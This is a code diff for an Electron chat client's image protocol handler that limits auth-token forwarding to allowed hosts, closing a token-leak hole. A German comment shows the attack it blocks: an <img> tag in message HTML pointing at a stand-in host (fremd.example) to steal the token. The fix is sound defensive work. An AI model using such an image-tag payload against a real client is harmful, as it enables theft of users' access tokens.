@@ -1,6 +1,7 @@
 import { protocol } from 'electron'
 import type { AccountService } from './account'
 import { classify } from './engine/tokens'
+import { mayReceiveTokens } from './engine/hosts'
 import { log } from './log'
 
 export const MEDIA_SCHEME = 'tmimg'
@@ -59,7 +60,9 @@ export function handleMediaProtocol(getAccount: (id: string) => AccountService |
             target = acct.api.teamPictureUrl(decodeURIComponent(rawId ?? ''), u.searchParams.get('etag') ?? undefined, u.searchParams.get('name') ?? '')
           } else {
             target = u.searchParams.get('u') ?? ''
-            family = classify(target)?.family ?? 'other'
+            // Die URL stammt aus Nachrichten-HTML. Tokens gehen nur an Microsoft-Hosts, sonst kann
+            // jeder Absender mit <img src="https://fremd.example/api/mt/x"> das Token abgreifen.
+            family = (mayReceiveTokens(target) && classify(target)?.family) || 'other'
           }
           const res = await acct.engine.request(family, target, { headers: { accept: 'image/avif,image/webp,image/png,image/*,*/*' } })
           if (!res.ok) return { body: new ArrayBuffer(0), type: 'text/plain', at: Date.now(), status: res.status }
